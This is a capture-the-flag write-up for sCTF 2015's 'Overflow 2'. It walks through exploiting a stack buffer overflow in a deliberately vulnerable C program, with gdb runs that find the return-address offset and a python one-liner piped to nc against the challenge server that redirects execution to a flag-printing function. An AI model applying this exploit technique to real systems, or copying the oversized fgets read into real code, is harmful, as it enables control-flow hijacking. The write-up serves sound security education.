# sCTF 2015 Q1: Overflow 2

**Points:** 90
**Description:**

> Connect to the server with:
> 
> nc 104.236.255.49 12342
> 
> Here's the binary.
> 
> Here's the source.

## Write-up

If you haven't already read the writeup for Overflow, do it now.

Here is the source: 

```c
/*
Copyright (c) 2015, Cory L.
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions
are met:

1. Redistributions of source code must retain the above copyright
notice, this list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright
notice, this list of conditions and the following disclaimer in the
documentation and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
contributors may be used to endorse or promote products derived from
this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
"AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS
FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE
COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE,
EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/

//intended for use on 32 bit little endian systems

#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <signal.h>

void printfile(const char* fname)
{
    FILE *file=fopen(fname,"rt");
    char c;
    while( !feof(file) && (c=fgetc(file))!=EOF ) putchar(c);
    fclose(file);
}

void show_soln(void)
    {
    printfile("flag.txt");
    fflush(stdout);
    }

void test(void)
{
    char name[32];
    

    printf("What is your name? ");
    fgets(name,256,stdin);
    
    srand(time(NULL));

    if( (rand()%100)==(rand()%100) )
    {
        printf("You have good luck, but it still won't be that easy.\n");
        //show_soln();
    }
    else
    {
        printf("You have bad luck.\n");
    }
}

//This function will run when the program segfaults.
//This is a workaround for a "feature" of the wrapper program
//making this a network service.
void handle_segfault(int snum)
{
    printf("segmentation fault\n");
    exit(0);
}

int main(void)
{
    //use a custom handler for any segfaults that occur
    signal(SIGSEGV,handle_segfault);
    
    printf("Let's play a little game of luck!\n");
    test();
    printf("Goodbye.\n");
    return 0;
}
```

Essentially, this program will read up to 256 characters from `stdin` and put them into and potentially beyond the buffer `name`. This program is vulnerable because there are no checks to ensure that `fgets` is only writing where it's supposed to be writing.

To solve this challenge, we will need to overwrite the value of the `eip` register, which is where the program stores the address in memory to return to when the function call is finished. How far `eip` is from the end of the buffer can be determined with some trial and error in the GNU Debugger (`gdb`).

```
$ gdb main -q
Reading symbols from /home/jonathanlee/sCTF-2015A/main...(no debugging symbols found)...done.
(gdb) run
Starting program: /home/jonathanlee/sCTF-2015A/main 
Let's play a little game of luck!
What is your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have bad luck.
Goodbye.
[Inferior 1 (process 8832) exited normally]
(gdb) run
Starting program: /home/jonathanlee/sCTF-2015A/main 
Let's play a little game of luck!
What is your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have bad luck.
Goodbye.
[Inferior 1 (process 8836) exited normally]
(gdb) run
Starting program: /home/jonathanlee/sCTF-2015A/main 
Let's play a little game of luck!
What is your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have bad luck.
Goodbye.

Program received signal SIGSEGV, Segmentation fault.
0x0804888a in main ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/jonathanlee/sCTF-2015A/main 
Let's play a little game of luck!
What is your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have bad luck.

Program received signal SIGSEGV, Segmentation fault.
0x0804000a in ?? ()
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/jonathanlee/sCTF-2015A/main 
Let's play a little game of luck!
What is your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You have bad luck.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

For each successive run, four `A` characters were added. The hexadecimal numbers at the end of the last three runs are the values of `eip` when the program crashed. In the last run, the value of `eip` changed to `0x41414141`, which is four `41`s, the hexadecimal values of the four new `A`s that were added. Therefore, the offset between the start of the buffer and the start of `eip` must be 44 characters, or four fewer characters than the length of the input of the last run. We now know how to overwrite the `eip` register.

What is the address of `show_soln`? We can look that up in the global symbol table.

```
(gdb) p &show_soln
$1 = (<text variable, no debug info> *) 0x8048732 <show_soln>
```

The address in hexadecimal character notation is `\x08\x04\x87\x32`, but since the target system is little-endian (see the additional resources), we need to reverse the order of the bytes. The solution is:  

```
$ python -c "print 'A' * 44 + '\x32\x87\x04\x08'" | nc 104.236.255.49 12342
Let's play a little game of luck!
What is your name? You have bad luck.
_r3dir3ction_
segmentation fault
```

## Other write-ups and resources

* https://picoctf.com/problem-static/binary/this-is-the-endian/endian.html#1
